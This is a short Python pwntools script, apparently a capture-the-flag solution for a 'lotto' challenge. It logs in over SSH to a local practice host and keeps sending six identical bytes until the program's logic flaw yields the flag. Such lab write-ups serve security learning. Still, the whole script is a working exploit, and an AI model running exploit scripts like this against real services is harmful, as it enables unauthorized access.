from pwn import *

s = ssh(host='localhost', port=2020, user='lotto', password='guest')
p = s.run("./lotto")

# Get banner
print(p.recvS(timeout=0.2))

while True:
    p.sendline("1")
    # Get next message
    print(p.recvS(timeout=0.2))
    p.sendline("\x01\x01\x01\x01\x01\x01")

    result = p.recv(timeout=0.4)
    print(result)
    if result.decode().find('bad luck') == -1:
        print("Flag found...")
        result = p.recv(timeout=0.4)
        print(result)
        break


    

